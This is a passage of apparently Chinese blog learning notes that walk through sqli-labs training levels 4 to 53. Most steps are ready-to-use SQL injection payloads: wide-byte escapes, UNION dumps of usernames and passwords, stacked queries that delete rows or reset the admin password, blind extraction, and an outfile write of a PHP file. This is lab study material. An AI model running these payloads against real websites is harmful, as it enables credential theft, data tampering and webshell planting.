<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
<li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol>
<li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="burp注入的另一种方案，在Hex栏修改16进制注入为df。"><a href="#burp注入的另一种方案，在Hex栏修改16进制注入为df。" class="headerlink" title="burp注入的另一种方案，在Hex栏修改16进制注入为df。"></a>burp注入的另一种方案，在Hex栏修改16进制注入为df。</h3><p>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>稍微改了个形式罢了，不足挂齿</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_35</title>
    <url>/2022/11/18/sqli-labs_35/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_38-41</title>
    <url>/2022/11/18/sqli-labs_38-41/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又可以学到新的注入方式–堆叠注入。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
</ol>
<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>与第38关相比差不多，只不过第39关不需要单引号</p>
<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>与38关差不多，也可堆叠注入</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>冲冲冲</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_36+37</title>
    <url>/2022/11/18/sqli-labs_36+37/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
<span id="more"></span>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
</ol>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>’</li>
<li>“</li>
<li>\x1a<br>那么直接用%df绕过</li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_4</title>
    <url>/2022/11/08/sqli-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_42-45</title>
    <url>/2022/11/19/sqli-labs_42-45/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改管理员密码(可以直接做)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_46+47</title>
    <url>/2022/11/19/sqli-labs_46+47/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure>
<p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure>
<p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入查询记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>
<p>用十六进制代替<?php phphinfo();?></p>
</li>
</ol>
<h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_48-53</title>
    <url>/2022/11/19/sqli-labs_48-53/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p>
<h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
<h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p>
<h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p>
<h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_5+6</title>
    <url>/2022/11/08/sqli-labs_5+6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
</li>
<li><p><strong>爆数据</strong></p>
